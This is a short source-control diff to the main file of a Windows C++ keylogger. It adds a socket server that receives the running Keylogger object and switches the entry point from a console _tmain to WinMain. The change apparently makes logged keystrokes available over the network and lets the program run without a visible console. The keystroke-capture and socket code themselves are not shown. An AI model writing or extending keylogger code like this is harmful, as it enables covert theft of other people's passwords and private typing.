@@ -3,6 +3,7 @@
 
 
 #include "stdafx.h"
+#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <string>
 #include <tchar.h>
@@ -13,15 +14,17 @@
 #include <fcntl.h>
 
 #include "Keylogger.h"
+#include "SocketServer.h"
 
 using namespace std;
 
 shared_ptr<Keylogger> logger;
+shared_ptr<SocketServer> socketServer;
 
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 	WPARAM wParam, LPARAM lParam);
 
-INT WINAPI _tmain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
 	
 	// Add console for debug
@@ -42,6 +45,9 @@ INT WINAPI _tmain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
 	logger = make_shared<Keylogger>();
 	logger->start();
+
+	socketServer = make_shared<SocketServer>(logger.get());
+	socketServer->start();
 	while (GetMessage(&msg, NULL, 0, 0)) {
 		DispatchMessage(&msg);
 	}
